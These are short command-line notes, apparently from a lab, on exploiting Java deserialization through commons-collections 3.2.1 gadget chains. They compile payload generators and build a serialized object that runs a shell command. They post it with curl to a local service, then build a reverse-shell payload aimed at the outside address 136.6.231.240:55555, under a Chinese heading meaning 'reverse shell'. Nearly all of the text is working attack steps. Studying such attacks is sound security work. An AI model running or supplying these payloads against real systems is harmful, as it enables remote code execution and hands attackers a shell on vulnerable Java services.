#

`$ javac -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1.java`

```
$ java -cp .:commons-collections-3.2.1.jar ExampleCommonsCollections1 'touch /tmp/h2hc_2017'
Saving serialized object in ExampleCommonsCollections1.ser
```

`curl 127.0.0.1:8000/ --data-binary @ExampleCommonsCollections1.ser`

反弹

`$ javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java`

```
$ java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 136.6.231.240:55555
Saving serialized object in ReverseShellCommonsCollectionsHashMap.ser
```

`curl 127.0.0.1:8000/ --data-binary @ReverseShellCommonsCollectionsHashMap.ser`